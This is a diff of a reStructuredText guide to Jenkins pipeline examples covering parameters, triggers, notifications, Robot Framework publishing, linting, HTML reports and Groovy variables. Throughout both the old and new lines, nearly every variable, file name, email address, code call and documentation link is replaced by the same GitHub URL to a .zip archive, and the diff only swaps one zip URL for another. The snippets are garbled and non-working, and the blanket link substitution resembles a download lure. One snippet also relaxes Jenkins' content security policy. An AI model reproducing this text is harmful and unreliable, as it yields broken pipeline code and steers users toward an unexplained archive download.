@@ -48,11 +48,11 @@ Possible parameters are boolean, choice, file, text, password, run, or string::
       stages {
           stage("my stage") {
               steps {
-                  echo "booleanExample: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}"
-                  echo "stringExample: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}"
-                  echo "textExample: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}"
-                  echo "choiceExample: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}"
-                  echo "passwordExample: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}"
+                  echo "booleanExample: ${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}"
+                  echo "stringExample: ${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}"
+                  echo "textExample: ${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}"
+                  echo "choiceExample: ${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}"
+                  echo "passwordExample: ${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}"
               }
           }
       }
@@ -77,7 +77,7 @@ Trigger build regularly with cron::
       }
   }
 
-Triggers Pipeline Syntax docs: `https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip`_.
+Triggers Pipeline Syntax docs: `https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip`_.
 
 Paremeterized Trigger / Cron::
 
@@ -100,7 +100,7 @@ Paremeterized Trigger / Cron::
           stage('Example') {
               steps {
                   echo "${GREETING} ${PLANET}"
-                  script { https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip = "${GREETING} ${PLANET}" }
+                  script { https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip = "${GREETING} ${PLANET}" }
               }
           }
       }
@@ -113,7 +113,7 @@ Git Checkout::
 
   checkout scm
 
-The Jenkinsfile job configuration already contains the repository URL. Therefore a checkout is as simple as that. See `this <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip>`_ for details.
+The Jenkinsfile job configuration already contains the repository URL. Therefore a checkout is as simple as that. See `this <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip>`_ for details.
 
 
 Clean Workspace
@@ -123,7 +123,7 @@ Clean workspace::
 
   deleteDir()
 
-See `Jenkins workflow basic steps docs <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip>`_ for more details.
+See `Jenkins workflow basic steps docs <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip>`_ for more details.
 
 
 Pipeline / Distributed Build
@@ -214,11 +214,11 @@ Declarative Pipeline
 
 Cloudbees announced a new declarative pipeline syntax in December 2016:
 
-https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip%3A+ContinuousBlog+%28Jenkins%29
+https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip%3A+ContinuousBlog+%28Jenkins%29
 
-https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip%20started
+https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip%20started
 
-https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip
+https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip
 
 This allows to write a cleaner pipeline::
 
@@ -254,10 +254,10 @@ This allows to write a cleaner pipeline::
         deleteDir()
       }
       success {
-        mail to:"https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip", subject:"SUCCESS: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}", body: "Yay, we passed."
+        mail to:"https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip", subject:"SUCCESS: ${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}", body: "Yay, we passed."
       }
       failure {
-        mail to:"https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip", subject:"FAILURE: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}", body: "Boo, we failed."
+        mail to:"https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip", subject:"FAILURE: ${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}", body: "Boo, we failed."
       }
     }
   }
@@ -312,7 +312,7 @@ Declarative Pipeline Post Actions (stage)::
     }
   }
 
-Post action docs: https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip
+Post action docs: https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip
 
 Declarative Pipeline Parallel Build Steps::
 
@@ -359,31 +359,31 @@ Email Notifications
 Send email notifications::
 
   emailext (
-    to: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
-    subject: "${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip} #${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip} [${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}]",
-    body: "Build URL: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}.\n\n",
+    to: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip',
+    subject: "${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip} #${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip} [${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}]",
+    body: "Build URL: ${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}.\n\n",
     attachLog: true,
   )
 
 Send email notifications to build requester and/or committers since last successful build::
 
   emailext (
-    subject: "FAILURE: #${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip} ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}",
-    body: "Hey, it seems one of your recent commits broke the build, please check ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}.",
+    subject: "FAILURE: #${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip} ${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}",
+    body: "Hey, it seems one of your recent commits broke the build, please check ${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}.",
     attachLog: true,
     recipientProviders: [[$class: 'RequesterRecipientProvider'], [$class:'CulpritsRecipientProvider']]
   )
       
-Requires `Email-ext Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+plugin>`_.
+Requires `Email-ext Plugin <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip+plugin>`_.
 
 Slack Notifications
 -------------------
 
 Add Slack notification::
 
-  slackSend channel: '#general', color: 'good', message: '[${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}] #${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip} ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}', teamDomain: 'kitconcept', token: '<ADD-TOKEN-HERE>'
+  slackSend channel: '#general', color: 'good', message: '[${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}] #${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip} ${https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip}', teamDomain: 'kitconcept', token: '<ADD-TOKEN-HERE>'
 
-Tutorial how to set up Jenkins and Slack: https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip
+Tutorial how to set up Jenkins and Slack: https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip
 
 Robot Framework
 ---------------
@@ -393,15 +393,15 @@ Publish Robot Framework test results::
   sh "pybot tests/acceptance"
   step([$class: 'RobotPublisher',
     disableArchiveOutput: false,
-    logFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
+    logFileName: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip',
     otherFiles: '',
-    outputFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
+    outputFileName: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip',
     outputPath: '.',
     passThreshold: 100,
-    reportFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
+    reportFileName: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip',
     unstableThreshold: 0]);
 
-Requires `Robot Framework Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Framework+Plugin>`_.
+Requires `Robot Framework Plugin <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip+Framework+Plugin>`_.
 
 Running Robot Framework test with Selenium requires wrapping the test execution into an Xvfb wrapper::
 
@@ -409,12 +409,12 @@ Running Robot Framework test with Selenium requires wrapping the test execution 
     sh ".env/bin/pybot tests/acceptance"
     step([$class: 'RobotPublisher',
       disableArchiveOutput: false,
-      logFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
+      logFileName: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip',
       otherFiles: '',
-      outputFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
+      outputFileName: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip',
       outputPath: '.',
       passThreshold: 100,
-      reportFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
+      reportFileName: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip',
       unstableThreshold: 0]);
   }
 
@@ -424,13 +424,13 @@ Robot for Plone::
   step([
     $class: 'RobotPublisher',
     disableArchiveOutput: false,
-    logFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
+    logFileName: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip',
     onlyCritical: true,
     otherFiles: '**/*.png',
-    outputFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
+    outputFileName: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip',
     outputPath: 'parts/test',
     passThreshold: 100,
-    reportFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
+    reportFileName: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip',
     unstableThreshold: 0
   ]);
 
@@ -439,9 +439,9 @@ Port Allocation
 
 In order to scale Jenkins, your builds need to be able to run in parallel. You can use containers to isolate the builds or allocate ports for each job/test run::
 
-  sh ".env/bin/pybot --variable PORT=\$(python -c \"import socket; s = https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip(https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip, https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip); https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip(('', 0)); print(https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip()[1])\") tests/acceptance"
+  sh ".env/bin/pybot --variable PORT=\$(python -c \"import socket; s = https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip(https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip, https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip); https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip(('', 0)); print(https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip()[1])\") tests/acceptance"
 
-The `Port Allocator Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Allocator+Plugin>`_ is currently not compatible with pipeline jobs. Therefore we use a simple Python script to do the trick (make sure you have a Python interpreter on your machine).
+The `Port Allocator Plugin <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip+Allocator+Plugin>`_ is currently not compatible with pipeline jobs. Therefore we use a simple Python script to do the trick (make sure you have a Python interpreter on your machine).
 
 
 Static Code Analysis
@@ -454,7 +454,7 @@ Pep8/Flake8:
     step([$class: 'WarningsPublisher',
       parserConfigurations: [[
         parserName: 'Pep8',
-        pattern: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip'
+        pattern: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip'
       ]],
       unstableTotalAll: '0',
       usePreviousBuildAsReference: true
@@ -470,16 +470,16 @@ TSLint::
     step([$class: 'WarningsPublisher',
       parserConfigurations: [[
         parserName: 'JSLint',
-        pattern: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip'
+        pattern: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip'
       ]],
       unstableTotalAll: '0',
       usePreviousBuildAsReference: true
     ])
   }
 
-Requires `Warnings Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Plugin>`_.
+Requires `Warnings Plugin <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip+Plugin>`_.
 
-There is no documentation whatsoever available of how to use this plugin with Jenkins pipelines. See this `github commit <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip>`_. for details.
+There is no documentation whatsoever available of how to use this plugin with Jenkins pipelines. See this `github commit <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip>`_. for details.
 
 
 Linting
@@ -489,13 +489,13 @@ Publish ESLint report::
 
   sh "npm run lint"
   step([$class: 'CheckStylePublisher',
-    pattern: '**https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
+    pattern: '**https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip',
     unstableTotalAll: '0',
     usePreviousBuildAsReference: true])
 
-Requires `Checkstyle Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Plugin>`_.
+Requires `Checkstyle Plugin <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip+Plugin>`_.
 
-I used the `Violations Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip>` before but this plugin is not compatible with pipeline jobs and it seems it became unmaintained.
+I used the `Violations Plugin <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip>` before but this plugin is not compatible with pipeline jobs and it seems it became unmaintained.
 
 
 HTML Reports
@@ -508,16 +508,16 @@ Publish HTML::
       alwaysLinkToLastBuild: false,
       keepAll: true,
       reportDir: 'docs/_build',
-      reportFiles: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
+      reportFiles: 'https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip',
       reportName: "Developer Documentation"
     ])
 
-Requires `HTML Publisher Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Publisher+Plugin>`_.
+Requires `HTML Publisher Plugin <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip+Publisher+Plugin>`_.
 
 For some reports, such as lighthouse you need to relax the content security policy in your /etc/default/jenkins file:
 
 ```
-JAVA_ARGS="https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip\"sandbox allow-scripts; default-src *; style-src * http://* 'unsafe-inline' 'unsafe-eval'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'; img-src 'self' data:\""
+JAVA_ARGS="https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip\"sandbox allow-scripts; default-src *; style-src * http://* 'unsafe-inline' 'unsafe-eval'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'; img-src 'self' data:\""
 ```
 
 Code Coverage
@@ -525,7 +525,7 @@ Code Coverage
 
 The Cobertura plugin is not there yet:
 
-https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip
+https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip
 
 You can use the HTML publisher plugin instead though.
 
@@ -533,7 +533,7 @@ You can use the HTML publisher plugin instead though.
 Timeouts
 --------
 
-Tests or build steps are sometimes stuck because of issues beyond our control. Therefore it makes sense to kill a build if it is stuck. For traditional Jenkins jobs there is the `Build-timeout Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Plugin>`_. Though, pipelines give us a far more fine-grained control::
+Tests or build steps are sometimes stuck because of issues beyond our control. Therefore it makes sense to kill a build if it is stuck. For traditional Jenkins jobs there is the `Build-timeout Plugin <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip+Plugin>`_. Though, pipelines give us a far more fine-grained control::
 
   timeout(time: 5, unit: 'MINUTES') {
     ...
@@ -550,7 +550,7 @@ Lock a resource that requires exclusive access::
     // any other build will wait until the one locking the resource leaves this block
   }
 
-Requires `Lockable Resources Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Resources+Plugin>`_.
+Requires `Lockable Resources Plugin <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip+Resources+Plugin>`_.
 
 Lock multiple stages in a declarative pipeline::
 
@@ -568,40 +568,40 @@ Lock multiple stages in a declarative pipeline::
     }
   }
 
-NOT THERE YET! https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip
+NOT THERE YET! https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip
 
 Icons/Badges
 ------------
 
-The  `Groovy Postbuild Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Postbuild+Plugin>`_ allows to annotate builds with icons or badges. E.g. add a version badge to the build::
+The  `Groovy Postbuild Plugin <https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip+Postbuild+Plugin>`_ allows to annotate builds with icons or badges. E.g. add a version badge to the build::
 
-  version=readFile('https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip')
-  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip("${version}")
+  version=readFile('https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip')
+  https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip("${version}")
 
 Add warnings badge to the build::
 
-  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip("Deployment to https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip failed!")
+  https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip("Deployment to https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip failed!")
 
 Add warning message to the detailed build view::
 
-  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip("https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip").appendText("<h1>Deployment to https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip failed!</h1>", false, false, false, "red")
+  https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip("https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip").appendText("<h1>Deployment to https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip failed!</h1>", false, false, false, "red")
 
 Groovy Variables
 ----------------
 
 Load file content into Groovy variable::
 
-  version=readFile('https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip')
+  version=readFile('https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip')
 
 Use Groovy variable::
 
-  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip = 'VNCuxf Mail (${version})'
+  https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip = 'VNCuxf Mail (${version})'
 
 Declarative Pipeline::
 
   script {
     VERSION = sh(
-      script: 'cat https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip | python -c "import sys, json; print https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip(https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip)[\'version\']"',
+      script: 'cat https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip | python -c "import sys, json; print https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip(https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip)[\'version\']"',
       returnStdout: true
   ).trim()
 
@@ -624,10 +624,10 @@ Global Variables
 
 Current Build::
 
-  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip
-  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip
-  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip
+  https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip
+  https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip
+  https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip
 
 Environment::
 
-  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip
+  https://github.com/mohanpeddayyagri/jenkins-pipeline-examples/raw/refs/heads/master/examples/pipeline_jenkins_examples_1.1.zip
